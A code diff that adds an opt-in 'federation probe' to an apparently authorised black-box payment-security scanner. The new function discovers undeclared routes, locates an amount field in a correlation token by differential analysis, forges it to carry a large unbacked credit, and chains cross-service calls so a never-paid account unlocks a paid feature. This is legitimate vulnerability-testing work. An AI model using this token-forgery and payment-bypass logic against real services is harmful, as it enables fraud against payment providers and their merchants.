@@ -207,7 +207,9 @@ class PureBlackBoxEngine:
                  enable_fabric_probe: bool = False, fabric_use_dag: bool = True, fabric_use_race: bool = True,
                  fabric_multi_candidate: bool = True, fabric_fresh_challenge: bool = True,
                  enable_reconciliation_probe: bool = False, recon_use_lifecycle: bool = True,
-                 recon_use_overlay: bool = True, recon_use_sequence: bool = True) -> None:
+                 recon_use_overlay: bool = True, recon_use_sequence: bool = True,
+                 enable_federation: bool = False, fed_use_discovery: bool = True, fed_use_token_re: bool = True,
+                 fed_use_trust_graph: bool = True, fed_use_orchestration: bool = True) -> None:
         self._prioritizer = prioritizer  # ZR-003/ZR-012: None keeps the static EXPERIMENT_ORDER, exactly as before
         # B45 recon-breadth + B46 chain-composition: FAIL-CLOSED. Off unless an authorised caller enables them; when off, the probes are no-ops and behaviour is identical to before.
         self._enable_channel_probe = enable_channel_probe
@@ -287,6 +289,28 @@ class PureBlackBoxEngine:
         self._recon_use_lifecycle = recon_use_lifecycle
         self._recon_use_overlay = recon_use_overlay
         self._recon_use_sequence = recon_use_sequence
+        # B53-B56 DEMIURGE federation probe: OPT-IN (off by default). The first probe for a DISTRIBUTED target -- a
+        # payment FEDERATION whose archon surface is UNDECLARED (only advertised in the edge's public reference) and
+        # whose one no-payment bypass is a CONFUSED DEPUTY across services, carried by an opaque packed correlation
+        # token. It adds four capability CLASSES the single-session composers lack as subsystems: (B53) undeclared-
+        # operation discovery from the reference; (B54) differential field-inference on the packed token to inject an
+        # unbacked basis a signed-field manipulation cannot reach; (B55) cross-service trust-graph composition (the
+        # confused-deputy order); (B56) orchestration-as-execution that holds the token/period/credit/challenge state
+        # across services and late-binds a fresh step-up. Confirmation is UNCHANGED (the real oracle must flip for a
+        # never-paid identity + an independent clean-session reproduction through the ConfirmationGate); it drives only
+        # the declared surface + reference-advertised customer paths (via the same ScopeGuard-gated raw() the channel
+        # probe uses) and only harvested black-box values, so a correctly-implemented federation yields no false
+        # positive. FAIL-CLOSED: a no-op when off. Four capability switches (default capable; flipped by ablation
+        # harnesses to PROVE each class is individually load-bearing): ``fed_use_discovery`` False -> no archon surface
+        # is synthesised; ``fed_use_token_re`` False -> the honest token (amount=real captures=0) is used, so the
+        # credit is zero and net due stays full; ``fed_use_trust_graph`` False -> the cross-service order is not
+        # composed; ``fed_use_orchestration`` False -> the fresh step-up challenge is not late-bound, so finalize is
+        # turned away.
+        self._enable_federation = enable_federation
+        self._fed_use_discovery = fed_use_discovery
+        self._fed_use_token_re = fed_use_token_re
+        self._fed_use_trust_graph = fed_use_trust_graph
+        self._fed_use_orchestration = fed_use_orchestration
         # B47 find-fast: opt-in triage mode -- stop after the first CONFIRMED_P0 (fewer calls). OFF by default, so a full assessment still runs every class and nothing changes.
         self._find_fast = find_fast
         if not getattr(http, "stateless", False):
@@ -1858,6 +1882,172 @@ class PureBlackBoxEngine:
                              server_side_oracle=f"{scen.oracle_id}: outcome=allowed, discriminating={cs.positive_ok}",
                              limitations=["Found by a bounded reconciliation-lifecycle composer: an open->overlay->close->reconcile lifecycle derived from the declared surface (a produced handle, a rate-bearing overlay and a seal op on it, and a terminal that consumes it), driven overlay-before-close-before-reconcile. A reconciliation that re-derives the authoritative amount from real captured bases, defers an unbacked overlay on close, or requires a real settlement basis to finalise is out of scope (reported as a gap, not ruled out)."])
 
+    async def _federation_probe(self, cs: ControlState) -> Finding | None:
+        """B53-B56 DEMIURGE federation composer (BOUNDED, FAIL-CLOSED): the first probe for a DISTRIBUTED target.
+
+        The archon surface is NOT in the brief; it is advertised only in the edge's public reference. The one
+        no-payment ENTERPRISE bypass is a CONFUSED DEPUTY across services, carried by an opaque packed correlation
+        token whose MAC does not cover its basis/amount region. Four capability classes, each individually load-bearing:
+
+          B53 -- DISCOVERY. Fetch every declared GET, harvest the archon routes the reference advertises, and bind the
+                 roles (mint/open/credit/close/finalize/step) by keyword. (``fed_use_discovery`` False -> no surface.)
+          B54 -- TOKEN RE. Pay the cheapest plan twice on a throwaway reference identity, mint a token after each, and
+                 DIFFERENTIALLY locate the 4-byte amount field by the known capture delta; then, on a never-paid
+                 identity, overwrite that field to inject a large unbacked credit. (``fed_use_token_re`` False -> the
+                 honest token carries amount 0, so the credit is zero and the net due stays full -> miss.)
+          B55 -- TRUST-GRAPH. Drive the cross-service confused-deputy order (mint -> open -> credit -> close ->
+                 finalize). (``fed_use_trust_graph`` False -> the order is not composed -> miss.)
+          B56 -- ORCHESTRATION. Hold the token/period/credit state across services and LATE-BIND a fresh step-up
+                 challenge immediately before finalize. (``fed_use_orchestration`` False -> no fresh challenge -> the
+                 step-up turns finalize away -> miss.)
+
+        Confirmation is UNCHANGED: a never-paid oracle flip + an independent clean-session reproduction through the
+        gate. A correctly-implemented federation (MAC covers the basis, credits re-derived against real captures,
+        unbacked credits deferred on close, a real captured basis required to finalise) yields no false positive."""
+        if not self._enable_federation:
+            return None
+        import base64 as _b64
+        import struct as _struct
+        b, feature = self.brief, self.brief.primary_feature()
+        if feature is None or not cs.setup_ok or not cs.positive_ok or not cs.negative_ok or cs.open_feature or cs.global_leak:
+            return None
+        if not self._fed_use_discovery:
+            return None  # B53 ablation: without undeclared-operation discovery there is no archon surface to drive
+
+        def _paths(body: Any, acc: list[tuple[str, str]]) -> None:
+            if isinstance(body, dict):
+                for k, v in body.items():
+                    if isinstance(v, str) and v.startswith("/"):
+                        acc.append((str(k), v))
+                    else:
+                        _paths(v, acc)
+            elif isinstance(body, list):
+                for v in body:
+                    _paths(v, acc)
+
+        def _role(pairs: list[tuple[str, str]], *kw: str) -> str | None:
+            return next((p for k, p in pairs if any(w in (k + " " + p).lower() for w in kw)), None)
+
+        def _first_str(body: Any, keys: tuple[str, ...]) -> str | None:
+            if isinstance(body, dict):
+                return next((body[k] for k in keys if isinstance(body.get(k), str) and body[k]), None)
+            return None
+
+        async def _mint(S: CustomerSession, mint_p: str, label: str) -> str | None:
+            r = await S.raw("POST", mint_p, label=label)
+            return _first_str(r.body, ("correlation_token", "token", "ct"))
+
+        # -- B53 discovery: harvest the archon routes the reference advertises, bind roles ---------------------------
+        try:
+            cal = await self.prov.acquire("u_fed_cal")
+        except IdentityPoolExhausted:
+            return None
+        pairs: list[tuple[str, str]] = []
+        for n, o in b.operations.items():
+            if o.method == "GET":
+                _paths((await cal.call(n, label=f"U:fed:disco:{n}")).body, pairs)
+        roles = {"mint": _role(pairs, "correlation", "token", "vault"), "open": _role(pairs, "open", "period", "meter"),
+                 "credit": _role(pairs, "credit", "dispute"), "close": _role(pairs, "close", "reconcil"),
+                 "final": _role(pairs, "finalize", "settle"), "step": _role(pairs, "stepup", "step", "challenge", "radar")}
+        if not all(roles[k] for k in ("mint", "open", "credit", "close", "final")):
+            return None
+
+        # -- B54 token RE: calibrate the amount-field offset by differential diffing of two known-amount tokens ------
+        amount_offset: int | None = None
+        if self._fed_use_token_re:
+            unit = int(round(float(b.plans.get(b.cheapest_plan, {}).get(b.primary_currency, 0.0)) * 100)) or 100
+            await self._pay(cal, plan=b.cheapest_plan, outcome_key="success", label="U:fed:cal:pay1")
+            t1 = await _mint(cal, roles["mint"], "U:fed:cal:mint1")
+            await self._pay(cal, plan=b.cheapest_plan, outcome_key="success", label="U:fed:cal:pay2")
+            t2 = await _mint(cal, roles["mint"], "U:fed:cal:mint2")
+            if t1 and t2:
+                try:
+                    d1, d2 = _b64.urlsafe_b64decode(t1.encode()), _b64.urlsafe_b64decode(t2.encode())
+                    if len(d1) == len(d2):
+                        for i in range(len(d1) - 3):
+                            if _struct.unpack(">I", d1[i:i + 4])[0] == unit and _struct.unpack(">I", d2[i:i + 4])[0] == unit * 2:
+                                amount_offset = i
+                                break
+                except Exception:  # noqa: BLE001
+                    amount_offset = None
+            if amount_offset is None:
+                return None  # could not reverse-engineer the token -> cannot inject an unbacked basis -> miss
+
+        def _forge(tok: str) -> str:
+            if not self._fed_use_token_re or amount_offset is None:
+                return tok  # honest token: amount reflects real captures (0 for a never-paid id) -> credit 0 -> miss
+            raw = bytearray(_b64.urlsafe_b64decode(tok.encode()))
+            if amount_offset + 4 <= len(raw):
+                raw[amount_offset:amount_offset + 4] = _struct.pack(">I", 100_000_000)  # a large unbacked credit -> net<=0
+            return _b64.urlsafe_b64encode(bytes(raw)).decode()
+
+        if not self._fed_use_trust_graph:
+            return None  # B55 ablation: the surface is discovered and the token RE'd, but the cross-service order is not composed
+
+        # -- B55/B56 orchestration: drive the cross-service confused-deputy order, late-binding a fresh step-up ------
+        async def assemble(label: str) -> tuple[CustomerSession | None, OracleObservation | None]:
+            try:
+                S = await self.prov.acquire(label)
+            except IdentityPoolExhausted:
+                return None, None
+            if (await self.oracle.check(S, feature, oracle_id=f"U:fed:{label}:pre")).outcome != "denied":
+                return S, None
+            tok = await _mint(S, roles["mint"], f"U:fed:{label}:mint")
+            if not tok:
+                return S, None
+            forged = _forge(tok)
+            opened = await S.raw("POST", roles["open"], label=f"U:fed:{label}:open", json_body={})
+            period = _first_str(opened.body, ("period", "handle", "id"))
+            if not period:
+                return S, None
+            await S.raw("POST", roles["credit"], label=f"U:fed:{label}:credit", json_body={"period": period, "ct": forged})
+            await S.raw("POST", roles["close"], label=f"U:fed:{label}:close", json_body={"period": period})
+            fin: dict[str, Any] = {"period": period, "ct": forged}
+            if roles["step"] and self._fed_use_orchestration:
+                ch = _first_str((await S.raw("POST", roles["step"], label=f"U:fed:{label}:stepup", json_body={})).body,
+                                ("challenge", "nonce", "id"))
+                if ch:
+                    fin["challenge"] = ch
+            rf = await S.raw("POST", roles["final"], label=f"U:fed:{label}:finalize", json_body=fin)
+            if not (rf.status and 200 <= rf.status < 300):
+                return S, None
+            return S, await self.oracle.check(S, feature, oracle_id=f"U:fed:{label}:post")
+
+        try:
+            S, scen = await assemble("u_fed")
+            if scen is None or scen.outcome != "allowed":
+                return None
+            _S2, repro = await assemble("u_fed_repro")
+        except IdentityPoolExhausted:
+            return None
+        if repro is None or repro.outcome != "allowed":
+            return None
+        decision, _, _ = await self._confirm(hyp="PBB-U", cs=cs, feature=feature, scenario=scen, qualifying=False,
+                                             discriminating=cs.positive_ok, repro=repro)
+        if not decision.confirmed:
+            return None
+        ids = _clean([*cs.artifact_ids, *scen.artifact_ids, *repro.artifact_ids])
+        return self._finding("PBB-U", Verdict.CONFIRMED_P0, "high",
+                             "A never-paid identity USED the paid feature after DISCOVERING an undeclared archon "
+                             "surface from the public reference, REVERSE-ENGINEERING a packed correlation token "
+                             "(differential field inference) to inject an unbacked basis, and driving a CROSS-SERVICE "
+                             "confused-deputy order (mint -> open -> credit -> close -> step-up -> finalize) across the "
+                             "payment federation with no captured payment; a clean session reproduced it. Internal "
+                             "cause: UNKNOWN.",
+                             artifacts=ids, token=decision.token,
+                             metrics={"roles": {k: v for k, v in roles.items() if v}, "amount_offset": amount_offset,
+                                      "chain": ["mint", "open", "credit", "close", "stepup", "finalize"]},
+                             payment_state="no qualifying payment was made at any step",
+                             actual_state="feature allowed after a cross-service no-payment finalize",
+                             entitlement_state="granted",
+                             server_side_oracle=f"{scen.oracle_id}: outcome=allowed, discriminating={cs.positive_ok}",
+                             limitations=["Found by a bounded federation composer: discovery of the archon surface from "
+                                          "the public reference, differential field inference on the opaque correlation "
+                                          "token, and a cross-service confused-deputy order. A federation that binds the "
+                                          "token's basis under its MAC, re-derives credits against real captures, defers "
+                                          "unbacked credits on close, or requires a real captured basis to finalise is "
+                                          "out of scope (reported as a gap, not ruled out)."])
+
     async def _exp_u(self, cs: ControlState) -> Finding:
         hyp = "PBB-U"
         if (blocked := self._precondition(cs, hyp)) is not None:
@@ -1874,6 +2064,8 @@ class PureBlackBoxEngine:
             return fabricked
         if self._enable_reconciliation_probe and (reconciled := await self._reconciliation_probe(cs)) is not None:
             return reconciled
+        if self._enable_federation and (federated := await self._federation_probe(cs)) is not None:
+            return federated
         artifacts: list[str | None] = []
         divergences: list[str] = []
         tested: dict[str, str] = {}
